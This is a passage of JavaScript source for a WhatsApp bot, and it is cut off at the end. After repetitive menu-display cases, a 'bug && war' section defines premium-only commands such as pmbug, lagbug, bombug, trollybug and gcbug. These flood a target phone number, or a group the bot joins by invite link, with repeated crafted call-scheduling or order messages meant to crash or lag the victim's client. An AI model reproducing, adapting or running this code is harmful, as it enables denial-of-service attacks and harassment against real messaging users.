                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'animemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stickermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'databasemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'aimenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'bugmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               nyanBot2.sendMessage(sender, { text: b }, { quoted: m })
               reply('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               reply(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'amountbug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return reply(mess.premium)
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
nyanBot2.relayMessage(victim, order.message, { messageId: order.key.id })
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return reply(mess.premium)
 if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await nyanBot2.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await nyanBot2.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await nyanBot2.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await nyanBot2.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await nyanBot2.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
nyanBot2.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await nyanBot2.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
